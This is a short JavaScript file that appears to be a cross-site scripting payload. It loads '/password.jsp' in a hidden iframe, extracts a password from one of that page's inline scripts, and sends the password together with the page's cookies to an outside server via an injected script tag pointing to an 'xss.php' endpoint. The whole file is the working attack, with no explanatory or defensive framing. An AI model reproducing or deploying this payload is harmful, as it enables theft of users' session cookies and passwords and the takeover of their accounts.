var iframe = document.createElement("iframe");
iframe.src = "/password.jsp";
iframe.style.display="none"
iframe.style.visibility="none"

function getPwd(iframe){
doc = iframe.contentDocument||iframe.contentWindow.document
line = doc.getElementsByTagName("script")[2].text.split("\n")[10]
start = line.indexOf("!= ")+4
end = line.length-3
pwd=line.substring(start,end)
var s = document.createElement("script");
s.type = "text/javascript";
s.src = "http://gradms.sturgeon.mopaas.com/xss.php?cookie="+doc.cookie+"&pwd="+pwd;
document.body.appendChild(s)
}

if (iframe.attachEvent){
    iframe.attachEvent("onload", function(){
        getPwd(iframe)
    });
} else {
    iframe.onload = function(){
        getPwd(iframe)
    };
}
document.body.appendChild(iframe);

